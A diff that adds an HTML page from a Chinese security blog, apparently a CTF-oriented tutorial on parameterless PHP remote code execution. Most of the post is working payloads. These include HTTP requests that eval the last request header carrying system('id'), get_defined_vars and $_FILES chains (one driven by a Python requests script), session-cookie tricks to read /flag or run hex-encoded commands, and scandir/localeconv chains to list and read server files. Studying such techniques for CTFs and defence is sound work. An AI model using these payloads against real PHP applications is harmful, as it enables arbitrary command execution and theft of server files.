@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf8" />
+    <meta name="viewport" content="initial-scale=1.0, width=device-width" />
+    <title>
+      
+        php无参数rce | 东隅's blog
+      
+    </title>
+    <meta name="description" content=""/>
+    <meta name="keywords" content=""/>
+    
+      <link rel="apple-touch-icon"
+            sizes="180x180"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="32x32"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="icon"
+            type="image/png"
+            sizes="16x16"
+            href="/images/jocker.png"/>
+    
+    
+      <link rel="mask-icon"
+            href="/images/jocker.png"
+            color=""/>
+    
+    
+    <link rel="stylesheet" type="text/css" href="/css/layout.css"/>
+    
+    
+  <link rel="stylesheet" type="text/css" href="/css/post.css"/>
+  
+
+  <meta name="generator" content="Hexo 5.4.0"></head>
+  <body>
+    <div class="head">
+      <div class="nav">
+        <a href="/" class="nav-logo">
+          <img alt="logo" height="60px" width="60px" src="/images/jocker.png" />
+        </a>
+        <input id="navBtn" type="checkbox"/>
+        <div class="nav-menu">
+          
+            
+              <a class="nav-menu-item" href="/%E5%AE%89%E5%85%A8">安全</a>
+            
+              <a class="nav-menu-item" href="/%E5%BC%80%E5%8F%91">开发</a>
+            
+              <a class="nav-menu-item" href="/%E7%94%9F%E6%B4%BB">生活</a>
+            
+          
+        </div>
+        <label class="nav-btn" for="navBtn"></label>
+      </div>
+    </div>
+    <div class="body">
+      
+  <article class="post-content">
+    <div class="post-inner">
+      <div class="post-content__head">
+        <div class="post-title">php无参数rce</div>
+        <div class="post-info">
+          
+  
+    <a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag">#php安全</a>
+  
+
+
+          <span class="post-date">2023-06-21</span>
+        </div>
+      </div>
+      <div id="postBody" class="post-content__body--toc">
+        <div id="tocAnchor" class="toc-anchor">
+          <ol id="toc" class="post-toc">
+            
+              <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">环境变量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E6%A0%87%E5%A4%B4"><span class="toc-text">HTTP 请求标头</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC1"><span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC2"><span class="toc-text">POC2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="toc-text">全局变量</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC1-1"><span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC2-1"><span class="toc-text">POC2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#poc3"><span class="toc-text">poc3</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#session"><span class="toc-text">session</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#POC1-2"><span class="toc-text">POC1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC2-2"><span class="toc-text">POC2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AF%BB%E7%9B%AE%E5%BD%95"><span class="toc-text">读目录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">查看当前目录文件名</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">读取当前目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E4%B8%8A%E4%B8%80%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">查看上一级目录文件名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%BB%E5%8F%96%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">读取上级目录文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%92%8C%E8%AF%BB%E5%8F%96%E6%A0%B9%E7%9B%AE%E5%BD%95%E6%96%87%E4%BB%B6"><span class="toc-text">查看和读取根目录文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%87%8A"><span class="toc-text">解释</span></a></li></ol></li></ol>
+            
+          </ol>
+        </div>
+        
+          <div class="post-gallery">
+            
+          </div>
+        
+        <p>[TOC]</p>
+<p>主要函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">目录操作：</span><br><span class="line">getchwd() ：函数返回当前工作目录。</span><br><span class="line">scandir() ：函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">数组相关的操作：</span><br><span class="line">end() - 将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">next() - 将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">prev() - 将内部指针指向数组中的上一个元素，并输出。</span><br><span class="line">reset() - 将内部指针指向数组中的第一个元素，并输出。</span><br><span class="line">each() - 返回当前元素的键名和键值，并将内部指针向前移动。</span><br><span class="line">array_shift() - 删除数组中第一个元素，并返回被删除元素的值。</span><br><span class="line">current()-返回数组中的当前值    </span><br><span class="line">pos()-current() 的别名</span><br><span class="line">    </span><br><span class="line">读文件</span><br><span class="line">show_source() - 对文件进行语法高亮显示。</span><br><span class="line">readfile() - 输出一个文件。</span><br><span class="line">highlight_file() - 对文件进行语法高亮显示。</span><br><span class="line">file_get_contents() - 把整个文件读入一个字符串中。</span><br><span class="line">readgzfile() - 可用于读取非 gzip 格式的文件</span><br><span class="line">    </span><br><span class="line">getenv() ：获取环境变量的值(在PHP7.<span class="number">1</span>之后可以不给予参数)</span><br><span class="line">适用于：php7以上的版本</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>实例</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$transport</span> = <span class="keyword">array</span>(<span class="string">&#x27;foot&#x27;</span>, <span class="string">&#x27;bike&#x27;</span>, <span class="string">&#x27;car&#x27;</span>, <span class="string">&#x27;plane&#x27;</span>);</span><br><span class="line"><span class="variable">$mode</span> = current(<span class="variable">$transport</span>); <span class="comment">// $mode = &#x27;foot&#x27;;</span></span><br><span class="line"><span class="variable">$mode</span> = next(<span class="variable">$transport</span>);    <span class="comment">// $mode = &#x27;bike&#x27;;</span></span><br><span class="line"><span class="variable">$mode</span> = current(<span class="variable">$transport</span>); <span class="comment">// $mode = &#x27;bike&#x27;;</span></span><br><span class="line"><span class="variable">$mode</span> = prev(<span class="variable">$transport</span>);    <span class="comment">// $mode = &#x27;foot&#x27;;</span></span><br><span class="line"><span class="variable">$mode</span> = end(<span class="variable">$transport</span>);     <span class="comment">// $mode = &#x27;plane&#x27;;</span></span><br><span class="line"><span class="variable">$mode</span> = current(<span class="variable">$transport</span>); <span class="comment">// $mode = &#x27;plane&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>();</span><br><span class="line">var_dump(current(<span class="variable">$arr</span>)); <span class="comment">// bool(false)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="keyword">array</span>());</span><br><span class="line">var_dump(current(<span class="variable">$arr</span>)); <span class="comment">// array(0) &#123; &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h1><p>var_dump(getenv(phpinfo()));</p>
+<h1 id="HTTP-请求标头"><a href="#HTTP-请求标头" class="headerlink" title="HTTP 请求标头"></a>HTTP 请求标头</h1><p>**getallheaders()**：获取所有 HTTP 请求标头</p>
+<p>apache_request_headers()的别名函数，但是该函数只能在Apache环境下使用<br>传入?code=print_r(getallheaders());，数组返回 HTTP 请求头</p>
+<h2 id="POC1"><a href="#POC1" class="headerlink" title="POC1"></a>POC1</h2><p>使用end指向最后一个请求头，用其值进行rce</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/1.php?code=eval(end(getallheaders()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line">.....</span><br><span class="line"><span class="attribute">flag</span><span class="punctuation">: </span>system(&#x27;id&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h2 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h2><p>此payload适用于php7以上版本</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/1.php?exp=eval(end(apache_request_headers()));</span>  <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="string">....</span></span><br><span class="line"><span class="string">flag:</span> system(&#x27;id&#x27;);</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h1><h2 id="POC1-1"><a href="#POC1-1" class="headerlink" title="POC1"></a>POC1</h2><p>**get_defined_vars()**：返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_COOKIE,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookie-&gt;files<br>**current()**：返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="keyword">eval</span>(end(current(get_defined_vars())));&amp;flag=system(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="POC2-1"><a href="#POC2-1" class="headerlink" title="POC2"></a>POC2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=system(<span class="string">&#x27;id&#x27;</span>);&amp;code=<span class="keyword">eval</span>(pos(pos(get_defined_vars())));</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="poc3"><a href="#poc3" class="headerlink" title="poc3"></a>poc3</h2><p>而如果网站对$_GET,$_POST,$_COOKIE都做的过滤， 那我们只能从$_FILES入手了，file数组在最后一个，需要end定位，然后pos两次定位获得文件名</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">files = &#123;</span><br><span class="line">   <span class="string">&quot;system(&#x27;whoami&#x27;);&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#data = &#123;</span></span><br><span class="line"><span class="comment">#&quot;code&quot;:&quot;eval(pos(pos(end(get_defined_vars()))));&quot;</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://your_vps_ip/1.php?code=eval(pos(pos(end(get_defined_vars()))));&#x27;</span>, files=files)</span><br><span class="line"><span class="built_in">print</span>(r.content.decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;ignore&quot;</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="session"><a href="#session" class="headerlink" title="session"></a>session</h1><p>适用于：php7以下的版本<br>● **session_start()**：启动新会话或者重用现有会话，成功开始会话返回 TRUE ，反之返回 FALSE,返回参数给session_id()<br>● **session_id()**：获取/设置当前会话 ID，返回当前会话ID。 如果当前没有会话，则返回空字符串（””）。</p>
+<h2 id="POC1-2"><a href="#POC1-2" class="headerlink" title="POC1"></a>POC1</h2><p>● show_source(session_id(session_start()));<br>● var_dump(file_get_contents(session_id(session_start())))<br>● highlight_file(session_id(session_start()));<br>● readfile(session_id(session_start()));<br>抓包传入Cookie: PHPSESSID=(想读的文件)即可</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/1.php?code=show_source(session_id(session_start()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=/flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242383.webp" alt="1645616832585"></p>
+<h2 id="POC2-2"><a href="#POC2-2" class="headerlink" title="POC2"></a>POC2</h2><p>**hex2bin()**函数可以将十六进制转换为ASCII 字符，所以我们传入十六进制并使用hex2bin()即可</p>
+<p>先传入eval(hex2bin(session_id(session_start())));，然后抓包传入Cookie: PHPSESSID=(“system(‘命令’)”的十六进制)即可</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/1.php?code=eval(hex2bin(session_id(session_start())));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=706870696e666f28293b</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="读目录"><a href="#读目录" class="headerlink" title="读目录"></a>读目录</h1><h2 id="查看当前目录文件名"><a href="#查看当前目录文件名" class="headerlink" title="查看当前目录文件名"></a>查看当前目录文件名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>
+
+<h3 id="读取当前目录文件"><a href="#读取当前目录文件" class="headerlink" title="读取当前目录文件"></a>读取当前目录文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">当前目录倒数第一位文件：</span><br><span class="line">show_source(end(scandir(getcwd())));</span><br><span class="line">show_source(current(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">当前目录倒数第二位文件：</span><br><span class="line">show_source(next(array_reverse(scandir(getcwd()))));</span><br><span class="line"></span><br><span class="line">随机返回当前目录文件：</span><br><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<h3 id="查看上一级目录文件名"><a href="#查看上一级目录文件名" class="headerlink" title="查看上一级目录文件名"></a>查看上一级目录文件名</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>
+
+<h3 id="读取上级目录文件"><a href="#读取上级目录文件" class="headerlink" title="读取上级目录文件"></a>读取上级目录文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>
+
+<p>payload解释：<br>● array_flip()：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 NULL。<br>● array_rand()：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，array_rand() 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。<br>● array_flip()和array_rand()配合使用可随机返回当前目录下的文件名<br>● dirname(chdir(dirname()))配合切换文件路径</p>
+<h3 id="查看和读取根目录文件"><a href="#查看和读取根目录文件" class="headerlink" title="查看和读取根目录文件"></a>查看和读取根目录文件</h3><p>所获得的字符串第一位有几率是/，需要多试几次</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(chr(ord(strrev(crypt(serialize(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h2><p>localeconv()函数返回的是一个数组，其中第一个元素是一个‘ . ’，呢就可以进行一些操作，比如scandir(.)查看当前目录文件，那么他是要配合current()函数的（current()函数返回当前数组的第一个单元）如图示：</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242248.webp" alt="1645614850054"></p>
+<p>那么可能会读出：</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242364.webp" alt="1645615067337"></p>
+<p>然后就是想办法去读取flag.php</p>
+<p>readfile(array_rand(arrar_flip(scandir(current(localeconv())))));</p>
+<p>highlight_file(next(array_reverse(scandir(current(localeconv())))));</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242368.webp" alt="1645615142517"></p>
+<p>1&gt;&gt;利用array_flip()函数，作用是调换数组的键和值，那么flag.php就会变成键，然后用array_rand()函数随机返回键名（刷新  抽奖），然后用readfile()函数读取文件</p>
+<p>2&gt;&gt;&gt; array_reverse() 函数返回翻转顺序的数组 ，next()返回迭代器的下一项，highlight()让选中的文件语法高亮</p>
+<p>测试如下：</p>
+<p><img src="https://my-pic-1309722427.cos.ap-nanjing.myqcloud.com/img/202305201242366.webp" alt="1645616587663"></p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/06/22/7.29/python%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E1/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>python web常见漏洞01</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/06/20/%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      临时文件包含
+    </a>
+  
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              <div class="matts">安</div><div class="matts">得</div><div class="matts">倚</div><div class="matts">天</div><div class="matts">剑</div>
+            </div>
+          
+            <div class="foot-line">
+              <div class="matts">跨</div><div class="matts">海</div><div class="matts">斩</div><div class="matts">长</div><div class="matts">鲸</div>
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+            <div class="foot-item">
+              <div class="foot-item__head">朋友</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://blog.huamang.xyz/">huamang</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link"
+                         height="20px"
+                         width="20px"
+                         src="/images/icon/icon-link.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Aurora-M/">Aurora</a>
+                  </div>
+                
+                <div class="text">
+                  <img alt="link"
+                       height="20px"
+                       width="20px"
+                       src="/images/icon/icon-link+.svg"/>
+                  <a class="foot-link"
+                     href="mailto:735587142@qq.com?subject=%E7%94%B3%E8%AF%B7%20Hozen.site%20%E7%9A%84%E5%8F%8B%E9%93%BE%E4%BD%8D%E7%BD%AE">
+                  申请友链</a>
+                </div>
+              </div>
+            </div>
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/MUNG29">github</a>
+                  </div>
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/QQ.png"/>
+                    <a class="foot-link" href="">735587142</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link"
+                     height="20px"
+                     width="20px"
+                     src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:735587142@qq.com">735587142@qq.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="https://MUNG29.github.io">东隅's blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)"
+            d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z" />
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)"
+            d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z" />
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)"
+            d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z" />
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+      <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+    
+    
+  
+  
+    <script type="text/javascript" src=/js/toc.js></script>
+  
+
+  </body>
+</html>
